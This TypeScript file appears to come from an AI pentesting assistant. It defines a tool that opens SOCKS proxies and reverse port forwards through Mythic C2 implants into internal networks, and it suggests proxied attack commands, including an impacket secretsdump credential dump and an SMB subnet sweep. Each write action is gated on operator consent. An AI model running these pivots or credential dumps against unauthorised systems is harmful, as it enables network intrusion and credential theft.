import { ToolDefinition } from "../types";
import {
  MYTHIC_NOT_CONFIGURED_MSG,
  describeMythicError,
  getCallback,
  getCallbackPorts,
  getMythicHost,
  isMythicConfigured,
  issueTask,
  waitForTaskOutput,
} from "../../services/mythic.client";
import { describeIntegrity, formatPorts } from "../../utils/mythicFormat";

/**
 * SOCKS and reverse port forwards in Mythic are not a server-side API — they are
 * agent commands (`socks`, `rpfwd`) taking a dictionary parameter. So this tool
 * issues the task and then reads back the `callbackport` table to confirm and to
 * report the address the operator must actually point proxychains at.
 */

const REACHABILITY_NOTE =
  "NOTE: the SOCKS listener binds on the MYTHIC SERVER, not on this work host. Mythic's docker-compose binds " +
  "these ports to 127.0.0.1 by default, so if Pentest Copilot runs elsewhere you must expose the port on the " +
  "Mythic host (or tunnel to it) before proxychains can use it.";

const mythicPivot: ToolDefinition = {
  name: "mythic_pivot",
  description:
    "Open or close network pivots through a Mythic C2 callback so the rest of the toolkit can reach internal " +
    "networks. Start a SOCKS proxy on a callback, then run nmap / netexec / impacket through it with run_bash " +
    "and proxychains. Also handles reverse port forwards (rpfwd) for getting traffic back from the target. " +
    "Operates against the operator's Mythic server; all C2 session data remains in Mythic, this tool only issues API calls.",
  parameters: {
    type: "object",
    properties: {
      action: {
        type: "string",
        enum: ["list", "socks_start", "socks_stop", "rpfwd_start", "rpfwd_stop"],
        description:
          '"list" shows current pivots; "socks_start"/"socks_stop" manage a SOCKS5 proxy through a callback; ' +
          '"rpfwd_start"/"rpfwd_stop" manage a reverse port forward.',
      },
      callback_display_id: {
        type: "number",
        description: "The callback to pivot through. Required for everything except a bare list.",
      },
      port: {
        type: "number",
        description:
          "The port to open on the Mythic server (SOCKS) or on the target host (rpfwd). Pick something free, " +
          "e.g. 7005. Required for all start/stop actions.",
      },
      remote_ip: {
        type: "string",
        description: 'For "rpfwd_start": the address traffic should be forwarded to, as seen from Mythic.',
      },
      remote_port: {
        type: "number",
        description: 'For "rpfwd_start": the port traffic should be forwarded to.',
      },
    },
    required: ["action"],
  },
  // No tool-level requiresConsent: that would prompt on the read-only "list" action
  // too. Every write action is hard-gated below instead.
  timeoutMs: 120_000,
  shouldRequireConsent(args) {
    // Opening a tunnel into a client network is always an operator decision, and
    // must never be taken by a subagent or racer on its own.
    return String(args?.action || "") !== "list";
  },
  async execute(args, ctx) {
    if (!isMythicConfigured()) {
      return { output: `Error: ${MYTHIC_NOT_CONFIGURED_MSG}`, exitCode: 1 };
    }

    const action = String(args.action || "");
    const mythicHost = getMythicHost();

    try {
      if (action === "list") {
        const callbackDisplayId = Number.isInteger(Number(args.callback_display_id))
          ? Number(args.callback_display_id)
          : undefined;
        const ports = await getCallbackPorts(callbackDisplayId);
        return { output: `${formatPorts(ports, mythicHost)}\n\n${REACHABILITY_NOTE}`, exitCode: 0 };
      }

      const callbackDisplayId = Number(args.callback_display_id);
      if (!Number.isInteger(callbackDisplayId)) {
        return { output: `Error: callback_display_id is required for "${action}".`, exitCode: 1 };
      }
      const port = Number(args.port);
      if (!Number.isInteger(port) || port < 1 || port > 65535) {
        return { output: `Error: a valid port is required for "${action}".`, exitCode: 1 };
      }

      const callback = await getCallback(callbackDisplayId);
      if (!callback) {
        return { output: `No callback with display id ${callbackDisplayId} exists in Mythic.`, exitCode: 1 };
      }

      let command: string;
      let params: Record<string, any>;

      if (action === "socks_start") {
        command = "socks";
        params = { action: "start", port };
      } else if (action === "socks_stop") {
        command = "socks";
        params = { action: "stop", port };
      } else if (action === "rpfwd_start") {
        const remotePort = Number(args.remote_port);
        if (!args.remote_ip || !Number.isInteger(remotePort)) {
          return {
            output: 'Error: remote_ip and remote_port are required for "rpfwd_start".',
            exitCode: 1,
          };
        }
        command = "rpfwd";
        params = { action: "start", port, remote_ip: String(args.remote_ip), remote_port: remotePort };
      } else if (action === "rpfwd_stop") {
        command = "rpfwd";
        params = { action: "stop", port };
      } else {
        return {
          output: `Error: Unknown action "${action}". Use "list", "socks_start", "socks_stop", "rpfwd_start" or "rpfwd_stop".`,
          exitCode: 1,
        };
      }

      const { taskDisplayId } = await issueTask({
        callbackDisplayId,
        command,
        params: JSON.stringify(params),
      });

      const { task, output, timedOut } = await waitForTaskOutput(taskDisplayId, { timeoutMs: 45_000 });
      const ports = await getCallbackPorts(callbackDisplayId);

      const starting = action.endsWith("_start");
      const summary =
        `Task ${taskDisplayId} (${command} ${JSON.stringify(params)}) on callback ${callbackDisplayId} ` +
        `(${callback.host || "?"}): ${timedOut ? "still running" : task?.status || "completed"}` +
        (output ? `\nAgent output: ${output.trim()}` : "");

      if (starting && action === "socks_start") {
        const proxy = `${mythicHost}:${port}`;
        ctx.engagementState?.upsertImplant({
          callbackDisplayId,
          host: callback.host || "unknown",
          user: callback.user,
          domain: callback.domain,
          os: callback.os,
          integrityLevel: describeIntegrity(callback.integrity_level),
          agentType: callback.payload?.payloadtype?.name,
          socksProxy: proxy,
        });

        return {
          output:
            `${summary}\n\nSOCKS5 proxy: ${proxy}\n` +
            `Route tools through it with run_bash, e.g.:\n` +
            `  proxychains4 -q nxc smb 10.0.0.0/24\n` +
            `  proxychains4 -q impacket-secretsdump 'DOMAIN/user@10.0.0.5'\n` +
            `(add "socks5 ${mythicHost} ${port}" to /etc/proxychains4.conf first)\n\n` +
            `Current pivots:\n${formatPorts(ports, mythicHost)}\n\n${REACHABILITY_NOTE}`,
          exitCode: 0,
        };
      }

      return {
        output: `${summary}\n\nCurrent pivots:\n${formatPorts(ports, mythicHost)}\n\n${REACHABILITY_NOTE}`,
        exitCode: 0,
      };
    } catch (err) {
      return { output: `Error: ${describeMythicError(err)}`, exitCode: 1 };
    }
  },
};

export default mythicPivot;
